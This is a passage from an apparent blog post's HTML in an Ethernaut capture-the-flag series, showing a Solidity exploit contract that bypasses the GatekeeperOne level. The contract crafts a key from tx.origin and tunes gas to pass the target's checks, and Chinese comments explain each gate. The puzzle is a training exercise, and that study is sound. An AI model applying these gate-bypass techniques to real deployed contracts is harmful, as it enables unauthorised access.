="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  function enter(address _target, uint gas) external &#123;</span><br><span class="line">    GatekeeperOne target = GatekeeperOne(_target);</span><br><span class="line"></span><br><span class="line">    //k = uint64(_gateKey) //需要创建一个满足下列条件的gateKey</span><br><span class="line"></span><br><span class="line">    uint16 k16 = uint16(uint160(tx.origin));</span><br><span class="line"></span><br><span class="line">    //uint32(k) != k //这是剩下的需要满足的条件 &gt;&gt; 我们注意到k=uint64 所以如果我们在这个数字的最左边加上1 然后将其转换为uint32类型 这样最左边加的1将被移除 两边不再相等</span><br><span class="line">    //uint32(k) == uint16(uint160(tx.origin)) //我们需要定义一个满足这个条件的k</span><br><span class="line">    //uint32(k) == uint16(k) //由于转换为了uint16 所以这个条件也满足了</span><br><span class="line"></span><br><span class="line">    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); //最后一步是将这个uint64转换为bytes8</span><br><span class="line"></span><br><span class="line">    bytes8 key = bytes8(k64);</span><br><span class="line"></span><br><span class="line">    require(gas &lt; 8191, &#x27;gas &gt;= 8191&#x27;);</span><br><span class="line">    require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &#x27;failed&#x27;); //将key作为input传入 在之前要先定义</span><br><span class="line"></span><br><span class="line">    //这样就成功完成了GateOne</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  //三层的gate，也就是有三重条件</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin); //msg.sender是调用合约的地址 tx.origin是发起交易的账户</span><br><span class="line">    _; //要使这两个地址不相等，我们只需要创建一个hack合约调用enter函数 这样msg.sender就是hack合约的地址</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0); //要求 在执行这部分代码时剩余的gas数量必须能被8191整除</span><br><span class="line">    _;</span><br><span class="line">    //在hack合约里加入一个测试 并多次运行测试 使用不同的gas量直到通过gatetwo\</span><br><span class="line">    //经过计算遍历后 我们需要的gas数量是256</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &#x27;GatekeeperOne: invalid gateThree part one&#x27;);</span><br><span class="line">    require(uint32(uint64(_gateKey)) != uint64(_gateKey), &#x27;GatekeeperOne: invalid gateThree part two&#x27;);</span><br><span class="line">    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &#x27;GatekeeperOne: invalid gateThree part three&#x27;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Target : Make it past the gatekeeper and register as an entrant</span><br><span class="line"></span><br></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/08/11/ETH12/">← Next Ethernaut Test-12</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/08/11/ETH14/">Ethernaut Test-14 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/1.png" alt="Logo"></a><h1 id="Dr"><a>LPigeon</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a
